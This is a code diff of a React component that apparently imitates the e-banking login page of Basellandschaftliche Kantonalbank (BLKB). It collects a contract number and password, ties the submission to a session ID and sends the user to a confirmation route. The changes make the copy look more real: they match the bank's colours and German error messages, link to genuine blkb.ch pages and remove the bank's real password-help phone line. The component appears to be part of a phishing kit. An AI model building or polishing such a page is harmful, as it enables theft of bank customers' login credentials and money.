@@ -6,7 +6,8 @@ import { usePageMeta } from "@/hooks/use-page-meta";
 import { Eye, EyeOff } from "lucide-react";
 import logoAsset from "@/assets/blkb-logo.svg.asset.json";
 
-const RED = "#FD000D";
+const RED = "#ba0a12";
+const LINK_RED = "#FD000D";
 
 type FieldProps = {
   id: string;
@@ -17,6 +18,7 @@ type FieldProps = {
   isPassword?: boolean;
   showPassword?: boolean;
   onTogglePassword?: () => void;
+  errorMessage: string;
 };
 
 const FloatingField = ({
@@ -28,46 +30,62 @@ const FloatingField = ({
   isPassword,
   showPassword,
   onTogglePassword,
+  errorMessage,
 }: FieldProps) => {
   const [focused, setFocused] = useState(false);
+  const [touched, setTouched] = useState(false);
   const active = focused || value.length > 0;
   const inputType = isPassword ? (showPassword ? "text" : "password") : type;
+  const hasError = touched && value.length === 0;
+  const borderColor = hasError ? RED : focused ? "#1a1a1a" : "#bdbdbd";
+  const labelColor = hasError ? RED : focused ? "#1a1a1a" : "#666";
 
   return (
-    <div className="relative">
-      <input
-        id={id}
-        type={inputType}
-        value={value}
-        onChange={(e) => onChange(e.target.value)}
-        onFocus={() => setFocused(true)}
-        onBlur={() => setFocused(false)}
-        className="w-full h-14 px-4 pr-10 border bg-white text-[15px] text-black outline-none rounded-[2px] transition-colors"
-        style={{ borderColor: focused ? "#1a1a1a" : "#bdbdbd" }}
-      />
-      <label
-        htmlFor={id}
-        className="absolute pointer-events-none transition-all bg-white px-1"
-        style={{
-          left: active ? 12 : 16,
-          top: active ? 0 : "50%",
-          transform: active ? "translateY(-50%)" : "translateY(-50%)",
-          fontSize: active ? 12 : 15,
-          color: active ? (focused ? "#1a1a1a" : "#666") : "#666",
-        }}
-      >
-        {label}
-        <span style={{ color: "#666" }}> *</span>
-      </label>
-      {isPassword && (
-        <button
-          type="button"
-          onClick={onTogglePassword}
-          aria-label="Passwort anzeigen"
-          className="absolute right-3 top-1/2 -translate-y-1/2 text-[#444]"
+    <div>
+      <div className="relative">
+        <input
+          id={id}
+          type={inputType}
+          value={value}
+          onChange={(e) => onChange(e.target.value)}
+          onFocus={() => setFocused(true)}
+          onBlur={() => {
+            setFocused(false);
+            setTouched(true);
+          }}
+          className="w-full h-14 px-4 pr-10 border bg-white text-[15px] text-black outline-none rounded-[2px] transition-colors"
+          style={{ borderColor }}
+        />
+        <label
+          htmlFor={id}
+          className="absolute pointer-events-none transition-all px-1"
+          style={{
+            left: active ? 12 : 16,
+            top: active ? 0 : "50%",
+            transform: "translateY(-50%)",
+            fontSize: active ? 12 : 15,
+            color: labelColor,
+            backgroundColor: "#ffffff",
+          }}
         >
-          {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
-        </button>
+          {label}
+          <span style={{ color: labelColor }}> *</span>
+        </label>
+        {isPassword && (
+          <button
+            type="button"
+            onClick={onTogglePassword}
+            aria-label="Passwort anzeigen"
+            className="absolute right-3 top-1/2 -translate-y-1/2 text-[#444]"
+          >
+            {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
+          </button>
+        )}
+      </div>
+      {hasError && (
+        <p className="mt-1 text-[13px]" style={{ color: RED }}>
+          {errorMessage}
+        </p>
       )}
     </div>
   );
@@ -110,16 +128,16 @@ const ChBasellandschaftlicheKantonalbank = () => {
           onComplete={() => navigate("/confirmation?s=" + sessionId)}
         />
       )}
-      <div className="min-h-screen flex flex-col bg-white">
+      <div className="min-h-screen flex flex-col" style={{ backgroundColor: "#fafafa" }}>
         {/* Header / Logo */}
-        <header className="pt-10 md:pt-12 px-6 md:px-16">
-          <img src={logoAsset.url} alt="BLKB" className="h-7 md:h-8" />
+        <header className="pt-10 md:pt-12 px-6 md:px-16" style={{ backgroundColor: "#fafafa" }}>
+          <img src={logoAsset.url} alt="BLKB" className="h-6 md:h-7" />
         </header>
 
         {/* Main Card */}
-        <main className="flex-1 flex flex-col items-center px-4 md:px-6">
-          <div className="w-full max-w-[580px] mt-8 md:mt-10 bg-white shadow-md rounded-sm p-6 md:p-12">
-            <h1 className="text-[26px] md:text-[28px] font-bold text-black mb-8">
+        <main className="flex-1 flex flex-col items-center px-4 md:px-6" style={{ backgroundColor: "#fafafa" }}>
+          <div className="w-full max-w-[580px] mt-16 md:mt-10 bg-white shadow-lg rounded-sm p-6 md:p-12">
+            <h1 className="text-[22px] md:text-[24px] font-bold text-black mb-8">
               Login E-Banking
             </h1>
 
@@ -129,6 +147,7 @@ const ChBasellandschaftlicheKantonalbank = () => {
                 label="Vertragsnummer / Benutzername"
                 value={vertragsnummer}
                 onChange={setVertragsnummer}
+                errorMessage="Bitte geben Sie Ihre Vertragsnummer ein."
               />
               <FloatingField
                 id="blkb-pass"
@@ -138,41 +157,36 @@ const ChBasellandschaftlicheKantonalbank = () => {
                 onChange={setPasswort}
                 showPassword={showPassword}
                 onTogglePassword={() => setShowPassword(!showPassword)}
+                errorMessage="Bitte geben Sie ihr Passwort ein."
               />
             </div>
 
             <div className="flex justify-end mt-8">
               <button
                 onClick={handleSubmit}
-                className="bg-[#1a1a1a] hover:bg-black text-white px-10 py-3 rounded-[2px] font-medium text-[15px] transition-colors"
+                className="bg-[#1a1a1a] hover:bg-[#ba0a12] text-white px-10 py-3 rounded-[2px] font-bold text-[15px] transition-colors"
               >
                 Weiter
               </button>
             </div>
 
             <div className="mt-10">
-              <h2 className="font-bold text-[15px] mb-2 text-black">Passwort vergessen?</h2>
-              <p className="text-[15px] text-black">
-                Rufen Sie uns an, wir sind rund um die Uhr für Sie da:{" "}
-                <a
-                  href="tel:+41619259599"
-                  className="hover:underline"
-                  style={{ color: RED }}
-                >
-                  +41 61 925 95 99
-                </a>
-              </p>
-            </div>
-
-            <div className="mt-8">
               <h2 className="font-bold text-[15px] mb-3 text-black">
                 Haben Sie noch kein E-Banking?
               </h2>
               <div className="flex flex-col gap-2">
-                <a href="#" className="font-bold text-[15px] hover:underline" style={{ color: RED }}>
+                <a
+                  href="https://www.blkb.ch/privatpersonen/e-banking/e-banking-blkb.html"
+                  className="font-bold text-[15px] hover:underline"
+                  style={{ color: LINK_RED }}
+                >
                   E-Banking bestellen
                 </a>
-                <a href="#" className="font-bold text-[15px] hover:underline" style={{ color: RED }}>
+                <a
+                  href="https://ebanking-demo.blkb.ch/wb/ui/uebersicht"
+                  className="font-bold text-[15px] hover:underline"
+                  style={{ color: LINK_RED }}
+                >
                   E-Banking testen (Demoversion)
                 </a>
               </div>
@@ -181,12 +195,12 @@ const ChBasellandschaftlicheKantonalbank = () => {
         </main>
 
         {/* Footer */}
-        <footer className="mt-12 bg-[#f5f5f5]">
-          <div className="px-6 md:px-16 py-4 flex flex-col md:flex-row justify-end items-center gap-4 md:gap-8 text-[14px]">
-            <a href="#" className="hover:underline" style={{ color: RED }}>
+        <footer className="mt-12" style={{ backgroundColor: "#f7f8fa" }}>
+          <div className="px-6 md:px-16 py-4 flex flex-col items-end gap-2 text-[14px]">
+            <a href="#" className="hover:font-bold no-underline" style={{ color: LINK_RED }}>
               Hilfe und Kontakt
             </a>
-            <a href="#" className="hover:underline" style={{ color: RED }}>
+            <a href="#" className="hover:font-bold no-underline" style={{ color: LINK_RED }}>
               Schützen Sie sich vor Betrügern
             </a>
           </div>
